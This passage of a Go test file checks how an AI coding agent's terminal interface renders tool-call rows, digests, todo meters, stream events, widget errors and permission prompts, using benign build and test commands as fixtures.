		t.Fatalf("broken sequence: pending=%v composer=%q", app.keySeq, app.composer.text)
	}
}

// TestCallRowClickIDs: a call's row and a thought's carry the id of their own
// view, a step's the id that opens its calls, each of those its own, and a
// digest's the run it folds.
func TestCallRowClickIDs(t *testing.T) {
	t.Parallel()
	app, host := bootAgentApp(t, 100, 30)
	host.AppendMessage("user", "look first")
	host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "read", Text: "b.go", Status: "ok"})
	host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "notice", Text: "explore  found it", Status: "ok", Run: "r1", Tool: "explore"})
	appendReply(host, "seen", hostapi.TurnStat{})
	host.AppendMessage("user", "fix it")
	appendReasoning(host, "how", hostapi.TurnStat{ThoughtMS: 6000})
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Tools: []hostapi.StreamTool{
		{Name: "edit", Input: "/w/a.go", Status: "ok", Diff: "--- a.go\n+++ a.go\n@@ -7,2 +7,2 @@\n-old\n+new\n keep"},
		{Name: "read", Input: "c.go", Status: "ok", Output: "1\tpackage c"},
		{Name: "read", Input: "d.go", Status: "ok"},
		{Name: "shell", Input: "make slow", Label: "Build it", Status: "bg", Job: "job-1", Output: "still running"},
	}})
	ids := func() map[string]string {
		app.renderSync(t)
		_ = app.Frame() // compose fills lastRows
		click := map[string]string{}
		for _, row := range app.lastRows {
			text := strings.Join(strings.Fields(hostapi.SegsText(row)), " ")
			for _, s := range row {
				if s.Click != "" {
					click[text] = s.Click
				}
			}
		}
		return click
	}
	for text, want := range map[string]string{
		"▸ 1 file: b.go":          "turn:2",
		"│ ✻ thought 6.0s":        "call:6",
		"│ ✓ edit /w/a.go +1 -1":  "call:-1",
		"│ ✓ read 2 files":        "step:-2",
		"✓ explore found it":      "agent:r1",
		"│ backgrounded as job-1": "job:job-1",
	} {
		if got := ids()[text]; got != want {
			t.Errorf("%q = %q, want %q (rows %v)", text, got, want, ids())
		}
	}
	x, y := findCell(t, app, "read 2 files")
	clickAt(app, x, y)
	for text, want := range map[string]string{
		"│ ├ read c.go": "call:-2",
		"│ └ read d.go": "call:-3",
	} {
		if got := ids()[text]; got != want {
			t.Errorf("%q = %q, want %q", text, got, want)
		}
	}
	// the step's row closes its calls again from its other cells too
	clickChat(t, app, "step:-2")
	app.renderSync(t)
	if frame := ansi.Strip(app.Frame()); strings.Contains(frame, "├ read c.go") || !strings.Contains(frame, "│ ✓ read 2 files") {
		t.Fatalf("a second click on the step does not close its calls:\n%s", frame)
	}
}

// TestToolRows: on the live rail a step's unlabelled calls that only looked
// around are one row saying what they did, or their own row when there is one
// of them, a labelled one its own row with
// no command under it, while edits and failures keep their rows, every mark
// at column 2 behind the bar; a kept command shows the model's description
// with the command under it. A call the turn has superseded reads as its
// header alone, its job line gone with the rest; the running one, a failure,
// a stopped call and an ask keep their rows.
func TestToolRows(t *testing.T) {
	t.Parallel()
	longQ := "Delete the 8 leftover worktree-agent-* branches too? They are all merged into main, so their commits stay reachable and nothing is lost."
	app, host := bootAgentApp(t, 100, 80)
	host.AppendMessage("user", "fix it")
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Tools: []hostapi.StreamTool{
		{Name: "read", Input: "a.go", Status: "ok"},
		{Name: "read", Input: "b.go", Status: "ok"},
		{Name: "shell", Input: "go vet ./...", Label: "Vet the code", Status: "ok", Output: "vet clean"},
		{Name: "edit", Input: "a.go", Status: "ok", Diff: "--- a.go\n+++ a.go\n@@ -7 +7 @@\n-old\n+new"},
		{Name: "shell", Input: "go test ./...", Label: "Run the unit tests", Status: "err", Output: "--- FAIL: TestX"},
		{Name: "grep", Input: strings.Repeat("pattern ", 30), Status: "ok"},
		{Name: "shell", Input: "cat > n.txt <<EOT\nfirst line\nEOT", Label: "Write notes", Status: "err"},
		{Name: "shell", Input: "printf a\nprintf b", Status: "err"},
		{Name: "shell", Input: "make slow", Label: "Build it", Status: "bg", Job: "job-1", Output: "still running"},
		{Name: "job_start", Input: "npm run dev", Label: "Dev server", Status: "bg", Job: "job-2", Output: "started job-2 (npm run dev)"},
		// a collapsed failure counts every line it hides, the host's cut
		// included; a command's shows its end, where its error and exit status are
		{Name: "shell", Input: "go build", Label: "Build the binary", Status: "err", Output: "e1\ne2\ne3\n… 21 more lines\nl1\nl2\nl3\nl4\nl5\nl6"},
		// a verdict the user gave shows as one line under a stop mark; the model keeps the reason and the instructions
		{Name: "question", Input: "Name?", Label: "name", Status: "stopped", Output: "The user dismissed the questions. Stop and wait for them to say how to proceed."},
		{Name: "write", Input: "b.go", Status: "stopped", Output: "permission denied (user): fs.write /p/b.go: it asked because this project is not trusted (/trust)"},
		{Name: "plan", Input: "# Plan", Status: "ok", Output: "approved, saved to /data/plans/s1.md"},
		{Name: "plan", Input: "# Plan", Status: "ok", Output: "changes requested: use go"},
		// an answered question reads its header, then each question with its
		// answer: on one line when it fits, the answer under it when not
		{Name: "question", Input: "Which auth method?", Label: "auth method", Status: "ok", Output: "Which auth method?\tOAuth\t"},
		{Name: "question", Input: longQ, Label: "branch cleanup", Status: "ok", Output: longQ + "\tYes, delete them\t"},
		{Name: "question", Input: "Which store? +1 more", Label: "store, cache size", Status: "ok", Output: "Which store?\tsqlite\tonly for now\nHow large may the cache grow?\tnot answered\t"},
		{Name: "shell", Input: "make again", Label: "Compile again", Status: "run"},
	}})
	app.renderSync(t)
	// a rail this long shows its last six entries; every row is under test
	clickChat(t, app, "more:0")
	app.renderSync(t)
	frame := ansi.Strip(app.Frame())
	// the rail keeps every row's mark at column 2: nothing but the bar starts
	// a row (the composer's last three rows and the statusline row aside)
	rows := strings.Split(frame, "\r\n")
	for _, r := range rows[:len(rows)-4] {
		if r = strings.TrimSpace(r); r != "" && !strings.HasPrefix(r, "│") && !strings.HasPrefix(r, "▌") {
			t.Fatalf("a rail row starts off the bar: %q\n%s", r, frame)
		}
	}
	for _, q := range []string{"Which auth method?", "Delete the 8 leftover", "Which store?"} {
		if n := strings.Count(frame, q); n != 1 {
			t.Fatalf("%q shows %d times, want once:\n%s", q, n, frame)
		}
	}
	for _, want := range []string{
		"│ ✓ read 2 files", "│ ✓ vet the code", "│ ✓ search pattern pattern pattern", "│ ⧗ build it", "│ ⧗ start dev server",
		"│     … 27 more lines", "│     l4", "│     l6", "│ ✓ edit a.go", "+1 -1", "│ ✗ run the unit tests", "│   ⎿ go test ./...", "│     --- FAIL: TestX",
		"│   ⎿ cat > n.txt <<EOT first line EOT", "│ ✗ run printf a printf b", "│   ⎿ make again",
		"│ ■ write b.go", "│   ⎿ denied by you", "│   ⎿ approved, saved to /data/plans/s1.md", "│   ⎿ changes requested: use go",
		"│ ■ ask name", "│   ⎿ Name?", "│     dismissed by you",
		"│ ✓ ask auth method", "│   ⎿ Which auth method?   OAuth", "│ ✓ ask branch cleanup", "│     Yes, delete them",
		"│ ✓ ask store, cache size", "│   ⎿ Which store?   sqlite", "│     note: only for now", "│     How large may the cache grow?   not answered",
	} {
		if !strings.Contains(frame, want) {
			t.Fatalf("missing %q:\n%s", want, frame)
		}
	}
	if strings.Contains(frame, "vet clean") || strings.Contains(frame, "go vet ./...") || strings.Contains(frame, "7 - old") || strings.Contains(frame, "    e1") || strings.Index(frame, "… 27 more lines") > strings.Index(frame, "    l4") || strings.Contains(frame, "it asked because") || strings.Contains(frame, "Stop and wait") || strings.Contains(frame, "Implement it now") || strings.Contains(frame, "backgrounded as") {
		t.Fatalf("a folded call's output stays out, a verdict row shows only the verdict, a superseded call its header:\n%s", frame)
	}
}

// TestRailWaitsOnNestedRun: a call whose work is another agent loop holds the
// turn, so its row says what the turn waits on in place of its verb, its own
// progress line under it unchanged; any other running call names its verb.
func TestRailWaitsOnNestedRun(t *testing.T) {
	t.Parallel()
	app, host := bootAgentApp(t, 100, 44)
	host.AppendMessage("user", "review it")
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 20 * time.Second, Tools: []hostapi.StreamTool{
		{Name: "workflow", Status: "run", Label: "review", Detail: "2/5 agents paused picking the diff apart"},
		{Name: "agent", Status: "run", Label: "explore"},
		{Name: "agent", Status: "run", Input: "all"},
		{Name: "workflow", Status: "run", Input: "wait kg29k2v2"},
		{Name: "read", Status: "run", Input: "a.go"},
		{Name: "job_read", Status: "run", Input: "job-3"},
		{Name: "job_list", Status: "run"},
	}})
	app.renderSync(t)
	frame := ansi.Strip(app.Frame())
	for _, want := range []string{
		"│ ⠋ waiting on workflow review",
		"│   ⎿ 2/5 agents paused picking the diff apart",
		"│ ⠋ waiting on agent explore",
		"│ ⠋ waiting for all agents and workflows",
		"│ ⠋ waiting on workflow kg29k2v2",
		"│ ⠋ read a.go",
		"│ ⠋ check job-3",
		"│ ⠋ list jobs",
	} {
		if !strings.Contains(frame, want) {
			t.Fatalf("missing %q:\n%s", want, frame)
		}
	}
}

// TestDigestCountsEveryFamily: a turn of one family's calls folds into its
// sentence, an MCP call counting under its server however many of its tools
// ran; a row an MCP call keeps of its own still reads as its name in words.
func TestDigestCountsEveryFamily(t *testing.T) {
	t.Parallel()
	app, host := bootAgentApp(t, 100, 80)
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Tools: []hostapi.StreamTool{
		{Name: "mcp_gitlab_get_commit", Input: "abc123", Status: "run"},
		{Name: "mcp_gitlab_get_commit", Input: "abc123", Status: "ok"},
		{Name: "mcp_gitlab_list_issues", Input: "state=open", Status: "ok"},
	}})
	app.renderSync(t)
	frame := ansi.Strip(app.Frame())
	for _, want := range []string{"│ ⠋ gitlab get commit abc123", "│ ✓ called 2 gitlab tools"} {
		if !strings.Contains(frame, want) {
			t.Fatalf("missing %q:\n%s", want, frame)
		}
	}
	host.SeedStream(hostapi.StreamSnapshot{})
	digests := func() []string {
		app.renderSync(t)
		var out []string
		for row := range strings.SplitSeq(ansi.Strip(app.Frame()), "\r\n") {
			if row = strings.TrimSpace(row); row != "" && !strings.Contains(row, "▌") {
				out = append(out, row)
			}
		}
		return out
	}
	for _, c := range []struct {
		name  string
		tools []string
		want  string
		rows  []hostapi.ChatMessage // when set, these ride instead of the tools
	}{
		{name: "mcp", tools: []string{"mcp_gitlab_get_commit", "mcp_gitlab_list_issues"}, want: "▸ 2 gitlab tools"},
		{name: "agent", tools: []string{"agent"}, want: "▸ 1 agent run: x"},
		{name: "workflow", tools: []string{"workflow"}, want: "▸ 1 workflow: x"},
		{name: "lua", tools: []string{"lua"}, want: "▸ 1 script: x"},
		{name: "tool_search", tools: []string{"tool_search"}, want: "▸ 1 tool: x"},
		{name: "mixed names the unlabelled command", want: "▸ 1 file: a.go, 1 command: make", rows: []hostapi.ChatMessage{
			{Role: "assistant", Kind: "tool", Tool: "read", Text: "a.go", Status: "ok"},
			{Role: "assistant", Kind: "tool", Tool: "shell", Text: "make", Status: "ok"},
		}},
		{name: "a lone failed call names its target", want: "▸ read failed: gone.txt", rows: []hostapi.ChatMessage{
			{Role: "assistant", Kind: "tool", Tool: "read", Text: "gone.txt", Status: "err"},
		}},
		{name: "a failed call reads its refusal", want: "▸ update failed: todo 1: status must be pending, in_progress or done", rows: []hostapi.ChatMessage{
			{Role: "assistant", Kind: "tool", Tool: "todos", Text: "1 todos, 0 done", Output: "todo 1: status must be pending, in_progress or done", Status: "err"},
		}},
		{name: "a denied call stays in the digest", want: "▸ write denied by you", rows: []hostapi.ChatMessage{
			{Role: "assistant", Kind: "tool", Tool: "write", Text: "b.go", Output: "permission denied (user): fs.write b.go: untrusted", Status: "stopped"},
		}},
		{name: "a lone command with a diff folds into its digest", want: "▸ 1 command: make a mess", rows: []hostapi.ChatMessage{
			{Role: "assistant", Kind: "tool", Tool: "shell", Text: "make", Label: "make a mess", Status: "ok", Diff: "--- a\n+++ a\n@@\n-a\n-b"},
		}},
	} {
		t.Run(c.name, func(t *testing.T) {
			host.AppendMessage("user", "go")
			if c.rows != nil {
				for _, row := range c.rows {
					host.AppendChat(row)
				}
			}
			for _, tool := range c.tools {
				host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: tools.ToolName(tool), Text: "x", Status: "ok"})
			}
			appendReply(host, "done", hostapi.TurnStat{})
			if got := digests(); !slices.Contains(got, c.want) {
				t.Fatalf("no digest %q in %q", c.want, got)
			}
		})
	}
}

// TestTodosMeterWithinTheWindow: a list at or under the shown window draws
// two cells per item with each cell its own state: the scaled path above
// never draws the all-done lie a wrong divisor gives.
func TestTodosMeterWithinTheWindow(t *testing.T) {
	t.Parallel()
	app, host := bootAgentApp(t, 100, 24)
	seedTodos(t, host, []store.Todo{
		{Content: "one", Status: "done"}, {Content: "two", Status: "in_progress"}, {Content: "three", Status: "pending"},
	})
	lines, _ := renderChat(t, app, 80, 24, app.uiState())
	for _, l := range lines {
		r := strings.TrimRight(hostapi.SegsText(l), " ")
		if !strings.HasPrefix(r, "Todos ") {
			continue
		}
		if !strings.Contains(r, "1/3   ━━━━━━") {
			t.Fatalf("three items must draw six cells, two per item: %q", r)
		}
		// an item's both cells take its hue: the done pair, the live pair,
		// the dim rest
		var hue []string
		for _, s := range l {
			if s.Text == "━" {
				hue = append(hue, s.HL)
			}
		}
		if want := []string{"TodoDone", "TodoDone", "TodoMark", "TodoMark", "Rule", "Rule"}; !slices.Equal(hue, want) {
			t.Fatalf("the meter's hues read %v, want %v", hue, want)
		}
		return
	}
	t.Fatal("no todos header")
}

// TestShimmerHoldsTheFrameClock: a drawn breathing label moves by itself, so
// the tick stays on the frame clock while one is on screen.
func TestShimmerHoldsTheFrameClock(t *testing.T) {
	t.Parallel()
	app, _ := bootAgentApp(t, 80, 24)
	segs := []hostapi.Segment{{Text: "checking health", Effect: "shimmer"}}
	if _, moved := segEffects(app.thm, 50, segs); !moved {
		t.Fatal("a breathing label does not hold the frame clock")
	}
	if _, moved := segEffects(app.thm, 0, segs); moved {
		t.Fatal("a label at frame 0 moves the clock")
	}
}

// seedTodos writes the chat's todo list, as the todos tool would.
func seedTodos(t testing.TB, host *hostapi.Host, todos []store.Todo) {
	t.Helper()
	testStore(t, host)
	if err := host.PipelineFor().TodosWrite(todos); err != nil {
		t.Fatal(err)
	}
}

// TestTodoRowsFollowTheLiveItem: the rows keep the order the model wrote them
// in, the window trails the item in progress, and the fold rows account for
// what the window leaves out on either side.
func TestTodoRowsFollowTheLiveItem(t *testing.T) {
	for _, c := range []struct {
		name       string
		h          int
		live, last store.TodoStatus // the 13th and the 14th item
		want, gone []string
	}{
		{
			name: "long list",
			h:    41,
			live: "in_progress", last: "pending",
			want: []string{"… 1 more todo above", "✓ step 02", "▸ step 13", "… 1 more todo"},
			gone: []string{"step 01", "step 14"},
		},
		{
			// a short screen keeps a third of the chat for the list, so the
			// window trails the live item further in
			name: "short screen",
			h:    14,
			live: "in_progress", last: "pending",
			want: []string{"… 10 more todos above", "✓ step 11", "✓ step 12", "▸ step 13", "… 1 more todo"},
			gone: []string{"step 10", "step 14"},
		},
		{
			// nothing in progress: the window starts at the first item
			name: "nothing in progress",
			h:    41,
			live: "done", last: "pending",
			want: []string{"✓ step 01", "✓ step 12", "… 2 more todos"},
			gone: []string{"step 14"},
		},
	} {
		t.Run(c.name, func(t *testing.T) {
			t.Parallel()
			todoRows(t, c.h, c.live, c.last, c.want, c.gone)
		})
	}
}

func todoRows(t *testing.T, h int, live, last store.TodoStatus, want, gone []string) {
	app, host := bootAgentApp(t, 100, h)
	var todos []store.Todo
	for i := range 12 {
		todos = append(todos, store.Todo{Content: fmt.Sprintf("step %02d", i+1), Status: "done"})
	}
	todos = append(todos, store.Todo{Content: "step 13", Status: live}, store.Todo{Content: "step 14", Status: last})
	seedTodos(t, host, todos)
	host.AppendMessage("user", "do it")
	app.renderSync(t)
	frame := ansi.Strip(app.Frame())
	// in order, so a reordered list fails even with every row present
	at := 0
	for _, w := range want {
		i := strings.Index(frame[at:], w)
		if i < 0 {
			t.Fatalf("missing %q in order:\n%s", w, frame)
		}
		at += i + len(w)
	}
	for _, g := range gone {
		if strings.Contains(frame, g) {
			t.Fatalf("%q is outside the window:\n%s", g, frame)
		}
	}
}

func TestStreamEventsCoalesce(t *testing.T) {
	app := &App{testQueue: make(chan tea.Msg, _hookQueueSize), log: slog.New(slog.DiscardHandler), focused: true, now: time.Now}
	for range 3 * _hookQueueSize {
		app.AgentStream()
	}
	if n := len(app.testQueue); n != 1 {
		t.Fatalf("queued %d stream events, want 1", n)
	}
	app.TurnDone("", false)
	if n := len(app.testQueue); n != 2 {
		t.Fatalf("turn_done must always queue, got %d", n)
	}
	for app.Pump() {
	}
	app.AgentStream()
	if n := len(app.testQueue); n != 1 {
		t.Fatalf("a handled event must let the next one queue, got %d", n)
	}
}

// TestWidgetErrorRecordedOnce: a widget whose render raises is recorded in
// /errors once, not once per frame.
func TestWidgetErrorRecordedOnce(t *testing.T) {
	t.Parallel()
	app, host := bootAgentApp(t, 80, 20)
	addWidget(app, &widget{id: "bad", region: _regionStatusRight, render: func(*hostapi.ScreenState) ([][]hostapi.Segment, bool) {
		panic("boom")
	}})
	run := func(src string) {
		t.Helper()
		if err := host.RT.ExecuteChunk(t.Context(), src, "w.lua", lua.OriginUser); err != nil {
			t.Fatal(err)
		}
	}
	for range 10 {
		for app.Pump() {
		}
		if cmd := app.renderStaleWidgetsCmd(false); cmd != nil {
			app.Update(cmd())
		}
	}
	run(`local n = #zemi.errors.list(); assert(n == 1, "errors: " .. n)`)
}

// TestPermAlert: the ask pings with its label lowercased into the "zemi: "
// label and the target it acts on, the line the status record states.
func TestPermAlert(t *testing.T) {
	for _, c := range []struct {
		req  hostapi.PermRequest
		want string
	}{
		{hostapi.PermRequest{Subject: "tool.shell", Arg: "make check", Description: "run the check"}, "zemi: run this command? run the check"},
		{hostapi.PermRequest{Tool: "read", Subject: "fs.read", Arg: "/etc/hosts\nand more"}, "zemi: read this file? /etc/hosts"},
		{hostapi.PermRequest{Subject: "tool.workflow", Arg: "review"}, "zemi: run this workflow? review"},
		{hostapi.PermRequest{Tool: "mcp_github_create_issue", Subject: "mcp.github", Arg: "create_issue"}, "zemi: use create_issue from github?"},
		{hostapi.PermRequest{Subject: "tool.shell", Arg: "make", Description: "run the check\n\twith coverage"}, "zemi: run this command? run the check with coverage"},
		{hostapi.PermRequest{Subject: "tool.shell", Arg: "make", Description: strings.Repeat("x", 300)}, "zemi: run this command? " + strings.Repeat("x", 181) + "…"},
		{hostapi.PermRequest{Subject: "tool.shell", Arg: "  ", Description: "  "}, "zemi: run this command?"},
	} {
		if got := permAlert(c.req); got != c.want {
			t.Errorf("permAlert(%v) = %q, want %q", c.req, got, c.want)
		}
	}
}

// TestPermTitle: the prompt asks in words, from the request's typed fields,
// and its first fact names what the request acts on.
func TestPermTitle(t *testing.T) {
	for _, c := range []struct {
		req           hostapi.PermRequest
		title, target string // target: the fact's name and text, "" for none
	}{
		{hostapi.PermRequest{Subject: "tool.shell", Arg: "make"}, "Run this command?", "command make"},
		{hostapi.PermRequest{Subject: "tool.shell", Arg: "true"}, "Run this command?", "command true"},
		{hostapi.PermRequest{Tool: "skill", Subject: "fs.read", Arg: "/p/skills/x/SKILL.md"}, "Load this skill?", "file skills/x/SKILL.md"},
		{hostapi.PermRequest{Tool: "read", Subject: "fs.read", Arg: "/etc/hosts"}, "Read this file?", "file /etc/hosts"},
		{hostapi.PermRequest{Tool: "write", Subject: "fs.write", Arg: "/p/a.go"}, "Write this file?", "file a.go"},
		{hostapi.PermRequest{Tool: "edit", Subject: "fs.write", Arg: "a.go"}, "Edit this file?", "file a.go"},
		{hostapi.PermRequest{Tool: "notes", Subject: "fs.write", Arg: "a.go"}, "Change this file?", "file a.go"},
		{hostapi.PermRequest{Tool: "mcp_github_create_issue", Subject: "mcp.github", Arg: "create_issue"}, "Use create_issue from github?", ""},
		{hostapi.PermRequest{Tool: "lua", Subject: "tool.lua", Arg: "script"}, "Run Lua inside zemi?", ""},
		{hostapi.PermRequest{Tool: "lua", Subject: "tool.lua", Arg: "/p/x.lua"}, "Run Lua inside zemi?", "file x.lua"},
		{hostapi.PermRequest{Tool: "workflow", Subject: "tool.workflow", Arg: "review"}, "Run this workflow?", "workflow review"},
		{hostapi.PermRequest{Tool: "jira_create", Subject: "tool.jira_create", Arg: "jira_create"}, "Use the jira_create tool?", ""},
		{hostapi.PermRequest{Subject: "lua.fs.write", Arg: "x"}, "Allow lua.fs.write?", "arg x"},
	} {
		rows, _, _ := permFacts(c.req, "/p", 200, 40)
		var words []string
		for _, r := range rows {
			words = append(words, strings.Fields(hostapi.SegsText(r))...)
		}
		if title, target := permTitle(c.req), strings.Join(words, " "); title != c.title || target != c.target {
			t.Errorf("%+v: %q %q", c.req, title, target)
		}
	}
}
